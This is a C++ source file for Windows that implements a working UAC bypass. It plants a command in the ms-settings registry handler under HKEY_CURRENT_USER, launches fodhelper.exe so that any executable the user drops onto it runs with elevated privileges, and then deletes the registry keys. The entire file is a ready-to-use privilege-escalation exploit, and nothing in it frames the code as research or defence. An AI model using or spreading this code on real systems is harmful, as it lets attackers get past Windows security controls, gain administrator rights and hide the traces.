#include <windows.h>
#include <iostream>
#include <shlwapi.h>

#pragma comment(lib, "Shlwapi.lib")

int main(int argc, char* argv[]) {
#ifdef _WIN64
    std::cout << "[DEBUG] This is a 64-bit build." << std::endl;
#else
    std::cout << "[DEBUG] This is a 32-bit build." << std::endl;
#endif

    if (argc != 2 || !PathFileExistsA(argv[1])) {
        std::cout << "Please drag and drop a valid .exe file onto this program." << std::endl;
        goto wait_exit;
    }

    char payload[MAX_PATH + 100];
    sprintf_s(payload, sizeof(payload), "cmd.exe /c \"\"%s\"\"", argv[1]); // properly quoted

    HKEY hKey;
    LONG result = RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", &hKey);
    if (result != ERROR_SUCCESS) {
        std::cout << "[-] Failed to create registry key. Error code: " << result << std::endl;
        goto wait_exit;
    }

    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payload, (DWORD)(strlen(payload) + 1));
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
    RegCloseKey(hKey);

    std::cout << "[*] Registry trap created. Launching fodhelper.exe..." << std::endl;

    HINSTANCE hRes = ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_SHOW);
    if ((INT_PTR)hRes <= 32) {
        std::cout << "[-] Failed to launch fodhelper.exe! Error code: " << (LONG)(INT_PTR)hRes << std::endl;
        goto cleanup;
    }

    std::cout << "[*] Waiting a few seconds for payload..." << std::endl;
    Sleep(3000);

cleanup:
    std::cout << "[*] Cleaning registry..." << std::endl;
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

wait_exit:
    std::cout << "\n[+] Done. Press Enter to exit..." << std::endl;
    std::cin.get(); // absorbs newline from drag&drop
    std::cin.get();
    return 0;
}
